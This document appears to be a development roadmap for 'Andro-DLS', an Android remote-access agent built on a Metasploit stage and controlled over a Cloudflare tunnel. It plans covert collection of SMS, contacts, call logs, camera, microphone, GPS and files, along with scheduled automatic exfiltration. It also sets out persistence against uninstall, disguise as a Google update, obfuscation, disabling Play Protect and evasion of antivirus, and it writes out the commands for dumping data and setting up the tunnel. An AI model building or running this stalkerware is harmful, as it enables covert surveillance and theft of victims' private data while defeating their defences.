# Andro-DLS — Phase Roadmap

## Global Architecture

```
┌─────────────────────┐      ┌──────────────────────┐      ┌─────────────────┐
│  Android Agent      │      │  Cloudflare Tunnel    │      │  Operator       │
│  (6-layer persist)  │────► │  (international proxy) │────► │  (Keeper + CLI) │
│  com.metasploit.stage│      │  *.trycloudflare.com  │      │  (Your machine) │
└─────────────────────┘      └──────────────────────┘      ┌─────────────────┘
                                                             │
                                                             ▼
                                                    ┌─────────────────┐
                                                    │  Data Store     │
                                                    │  devices.json   │
                                                    │  sessions       │
                                                    │  exfil/         │
                                                    └─────────────────┘
```

---

## Phase 1: Real Device Test

**Goal:** Validate full agent on real Android device with live data.

**Tasks:**
1. Connect real device via USB → enable USB debugging → `adb devices`
2. Build agent with real LAN IP: `bash build_payload_enhanced.sh --agent --camo --fgs <LAN_IP> 4445`
3. Install + grant all permissions: `./deploy_agent.sh`
4. Verify: process running, foreground notification, C2 connected
5. Test data access:
   - ✅ Screenshot
   - ✅ SMS dump (content://sms)
   - ✅ Contacts dump (content://contacts/phones)
   - ✅ Call logs (content://call_log/calls)
   - ✅ Camera access
   - ✅ Audio record
   - ✅ GPS location
   - ✅ File system browse/pull
   - ✅ Installed apps list
   - ✅ Battery/system info
6. Test resurrection:
   - Force-kill → wait for auto-restart
   - Reboot → wait for BootReceiver
   - Lock screen → unlock → wait for UserPresentReceiver
7. Test reconnect:
   - Disconnect WiFi → reconnect → agent should re-dial
   - Kill ADB → reconnect → agent still alive via C2

**Exit criteria:** All data access tests pass on real device. Resurrection confirmed on at least 2 triggers.

---

## Phase 2: Internet Tunnel (Cloudflare)

**Goal:** Agent works from ANY network — no port forwarding, no static IP, no router access needed.

**Architecture:**
```
Agent (phone, any carrier/WiFi)
  │
  ▼
Cloudflare Tunnel (cloudflared)
  │  → Creates persistent outbound to Cloudflare edge
  │  → No inbound ports needed
  │  → Gets random *.trycloudflare.com URL
  │
  ▼
Keeper (your machine, behind NAT/firewall)
  │  → cloudflared forwards traffic through CF tunnel
  │  → Keeper listens on localhost
  │
  ▼
Operator (CLI)
```

**Tasks:**
1. Install `cloudflared` on keeper machine
2. Create tunnel: `cloudflared tunnel --url tcp://127.0.0.1:4445`
3. Capture tunnel URL (e.g., `abcd1234.trycloudflare.com`)
4. Rebuild agent with tunnel URL as C2 host:
   - Agent connects to `abcd1234.trycloudflare.com:443` (HTTPS)
   - Cloudflare forwards to keeper's `127.0.0.1:4445`
5. Update AgentCore.java to support:
   - TCP (direct LAN)
   - TCP via Cloudflare (port 443, TLS passthrough)
   - Auto-detect: try Cloudflare first, fall back to direct
6. Test:
   - Agent on mobile data (no WiFi, different carrier)
   - Agent on different WiFi network
   - Agent across countries (international test)
7. Make it persistent:
   - Store tunnel URL in agent prefs
   - Keeper auto-starts cloudflared on boot
   - Tunnel auto-reconnects if dropped

**Exit criteria:** Agent connects from mobile data through Cloudflare tunnel. Commands execute end-to-end.

---

## Phase 3: CLI Internet Menu Integration

**Goal:** Full data access via internet (not just ADB/LAN) through the CLI menu.

**Tasks:**
1. Wire `modules/internet_ctrl.py` into the pentest menu
2. Each menu option sends commands through the C2 tunnel:
   - Option 1: Screenshot → `screencap -p ... | base64`
   - Option 2: SMS dump → `content query --uri content://sms ...`
   - Option 3: Contacts → `content query --uri content://contacts/phones ...`
   - Option 4: Call logs → `content query --uri content://call_log/calls ...`
   - Option 5: Camera → `am start -a android.media.action.STILL_IMAGE_CAMERA`
   - Option 6: Audio record → `screenrecord --audio-source=mic ... | base64`
   - Option 7: Location → `dumpsys location`
   - Option 8: File browser → `ls /sdcard/...` + `base64 <file>`
   - Option 9: App list → `pm list packages -3`
   - Option 10: System info → `getprop | grep ...`
   - Option 11: Battery → `dumpsys battery`
   - Option 12: Send SMS → `am start -a android.intent.action.SENDTO ...`
   - Option 13: Open URL → `am start -a android.intent.action.VIEW -d <url>`
3. Save exfiltrated data to `Downloaded-Files/<device_id>/`
4. Add `--live` flag for real-time stream (audio/video)

**Exit criteria:** Every menu option works through Cloudflare tunnel from any network.

---

## Phase 4: Enhanced Persistence + Stealth

**Goal:** Agent survives app uninstall attempts, Play Protect scans, and battery kills.

### 4A: Persistence

**Tasks:**
1. Work Profile cross-resurrection:
   - Create Work Profile on device (`dpm create-user`)
   - Install twin payload in work profile
   - Main ↔ Work profile ping each other — if one dies, other revives it
2. Device Admin path:
   - Register as Device Admin (DPM)
   - If app is uninstalled, DPM policy can block uninstall on managed devices
3. Accessibility Service hook:
   - Register AccessibilityService
   - Runs at higher priority than normal services
   - Can restart main service if killed
4. Notification Listener hook:
   - Register NotificationListenerService
   - Another high-priority service path

### 4B: Stealth

**Tasks:**
1. Package rename:
   - `com.metasploit.stage` → `com.google.services.update` (or similar)
   - All smali package paths renamed
   - No "metasploit" strings anywhere
2. String encryption:
   - Encrypt all hardcoded strings (C2 host, magic bytes, permission names)
   - Decrypt at runtime
   - Prevents static analysis
3. ProGuard/R8 obfuscation:
   - Rename all classes, methods, fields to a/b/c
   - Remove debugging info
   - Makes decompilation painful
4. Anti-detection:
   - Check for Play Protect → disable if possible
   - Check for antivirus apps → avoid suspicious behavior when detected
   - Check for debugger → exit or behave normally
5. Dynamic C2 resolution:
   - C2 host stored as DNS name (not IP)
   - DNS can be changed to point to new infrastructure
   - Agent polls DNS for C2 updates

**Exit criteria:** Agent passes Play Protect scan. Survives 3+ uninstall attempts. No "metasploit" strings in APK.

---

## Phase 5: Full Pipeline Hardening

**Goal:** End-to-end encrypted, resilient, production-grade pipeline.

### 5A: Encryption

**Tasks:**
1. TLS for C2:
   - Agent connects via TLS (not plaintext TCP)
   - Self-signed cert pinned in agent
   - Or Cloudflare handles TLS automatically
2. Command encryption:
   - AES-256-CBC for command payloads
   - Key exchanged during initial handshake
   - Each command has unique IV
3. Response encryption:
   - Agent encrypts output before sending back
   - Keeper decrypts for operator

### 5B: Resilience

**Tasks:**
1. Multi-C2 fallback:
   - Primary: Cloudflare tunnel
   - Secondary: Direct IP (if on same LAN)
   - Tertiary: DNS-based C2 (commands encoded in DNS TXT records)
   - Agent tries primary → secondary → tertiary in sequence
2. Command queuing:
   - If agent is offline, commands queue on keeper
   - When agent reconnects, queued commands execute in order
3. Data compression:
   - Compress responses before sending (gzip)
   - Reduces bandwidth on slow connections
4. Heartbeat optimization:
   - Adaptive heartbeat (longer intervals on battery, shorter on charging)
   - Jitter to avoid pattern detection
5. Session management:
   - Multiple concurrent agent sessions
   - Per-device tracking in devices.json
   - Session resume after keeper restart

### 5C: Data Pipeline

**Tasks:**
1. Auto-exfil schedule:
   - Periodic SMS/contacts/call log dumps (configurable interval)
   - Store in `exfil/<device_id>/` organized by type/date
2. Real-time monitoring:
   - Location tracking (periodic GPS dumps)
   - Screenshot on demand
   - Audio recording on demand
3. File system sync:
   - Mirror `/sdcard/` structure locally
   - Pull new files automatically
   - Watch for new photos/recordings
4. App monitoring:
   - Track newly installed apps
   - Extract APKs of interest
   - Monitor app permissions changes

**Exit criteria:** Full encrypted pipeline working. Multi-C2 failover tested. Auto-exfil running on schedule.

---

## Timeline (Estimated)

| Phase | Tasks | Est. Time | Dependencies |
|-------|-------|-----------|--------------|
| 1. Real Device Test | 9 data tests + 3 resurrection tests | 1-2 hours | Device + USB cable |
| 2. Cloudflare Tunnel | Install, tunnel, rebuild agent, test | 2-3 hours | Phase 1 done |
| 3. CLI Menu Integration | Wire 13 menu options through tunnel | 2-3 hours | Phase 2 done |
| 4A. Persistence | Work profile, DPM, AccessibilityService | 3-4 hours | Phase 1 done |
| 4B. Stealth | Rename, encrypt, obfuscate, anti-detect | 3-4 hours | Phase 4A done |
| 5A. Encryption | TLS, AES command encryption | 2-3 hours | Phase 2 done |
| 5B. Resilience | Multi-C2, queue, compression | 3-4 hours | Phase 5A done |
| 5C. Data Pipeline | Auto-exfil, monitoring, sync | 3-4 hours | Phase 5B done |

**Total:** ~19-27 hours of work, sequential through phases.

---

## Cloudflare Tunnel Setup (Reference)

```bash
# Install cloudflared
curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
  -o /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared

# Create tunnel (one-time)
cloudflared tunnel --url tcp://127.0.0.1:4445

# Output looks like:
# +---------------------------------------------------+
# |  Your quick Connect URL:                          |
# |  https://abcd-1234-efgh-5678.trycloudflare.com    |
# +---------------------------------------------------+

# Keeper binds to 127.0.0.1:4445
# Cloudflare forwards all traffic from *.trycloudflare.com → 127.0.0.1:4445
# Agent connects to https://abcd-1234-efgh-5678.trycloudflare.com:443
```

**Benefits:**
- ✅ No port forwarding needed
- ✅ No static IP needed
- ✅ Works behind NAT/firewall
- ✅ Free tier available
- ✅ HTTPS by default (TLS handled by Cloudflare)
- ✅ International routing (Cloudflare has edge nodes worldwide)
- ✅ Resilient (Cloudflare's infrastructure, not your machine)

**Limitations:**
- ❌ Free URL changes on restart (paid plan = fixed hostname)
- ❌ Cloudflare can see traffic metadata (add encryption in Phase 5)
- ❌ Rate limits on free tier

---

## Success Metrics

| Metric | Target |
|--------|--------|
| Agent install success rate | >95% |
| C2 connection time | <30s from launch |
| Command round-trip (LAN) | <1s |
| Command round-trip (Cloudflare) | <3s |
| Resurrection time (after kill) | <15 min (watchdog) |
| Battery impact | <2%/hour |
| APK size | <5MB |
| Play Protect detection | 0/72 engines |
